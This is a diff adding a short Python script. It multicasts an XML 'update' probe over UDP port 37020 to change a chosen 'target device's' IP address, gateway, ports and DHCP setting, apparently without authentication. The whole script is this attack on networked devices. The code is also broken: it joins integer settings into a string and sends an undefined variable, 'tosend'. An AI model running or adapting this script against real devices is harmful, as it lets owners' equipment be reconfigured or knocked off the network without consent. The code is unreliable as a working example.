@@ -1,0 +1,39 @@
+import socket 
+import time 
+ 
+UDP_IP = "239.255.255.250" 
+UDP_PORT = 37020 
+ 
+DEVICE_MAC = "AA-BB-CC-DD-EE-FF" #change me - THIS IS THE TARGET DEVICE 
+ 
+#change me - update these params to change the target device configuration 
+NEW_IPV4 = "192.0.0.64" 
+NEW_IPV4_NM = "255.255.255.0" 
+NEW_GATEWAY = "192.0.0.5" 
+COMMAND_PORT = 8000
+IPV6ADDR = "::"
+IPV6GW = "::"
+IPV6MASKLEN = 0
+USEDHCP = "false"
+HTTPPORT = 80
+
+message = '<?xml version="1.0" encoding="utf-8"?><Probe><Uuid>DAB7B40C-38AA-4CF0-AB6A-E52E6E52B3B6</Uuid><Types>update</Types><PWErrorParse>true</PWErrorParse><MAC>'+DEVICE_MAC+'</MAC><IPv4Address>'+NEW_IPV4+'</IPv4Address><CommandPort>'+COMMAND_PORT+'</CommandPort><IPv4SubnetMask>'+NEW_IPV4_NM+'</IPv4SubnetMask><IPv4Gateway>'+NEW_GATEWAY+'</IPv4Gateway><IPv6Address>'+IPV6ADDR+'</IPv6Address><IPv6Gateway>'+IPV6GW+'</IPv6Gateway><IPv6MaskLen>'+IPV6MASKLEN+'</IPv6MaskLen><DHCP>'+USEDHCP+'</DHCP><HttpPort>'+HTTPPORT+'</HttpPort></Probe>' 
+ 
+print("UDP target IP: %s" % UDP_IP) 
+print("UDP target port: %s" % UDP_PORT) 
+print("message: %s" % message) 
+ 
+sock = socket.socket(socket.AF_INET, # Internet 
+                     socket.SOCK_DGRAM) # UDP 
+sock.setsockopt(socket.IPPROTO_IP, socket.IP_MULTICAST_TTL, 2) 
+sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1) 
+sock.settimeout(3) 
+ 
+try: 
+    sock.sendto(tosend.encode(), (UDP_IP, UDP_PORT)) 
+    data = sock.recv(4096) 
+    print(data.decode()) 
+except: 
+    print("TIMEOUT") 
+ 
+sock.close()
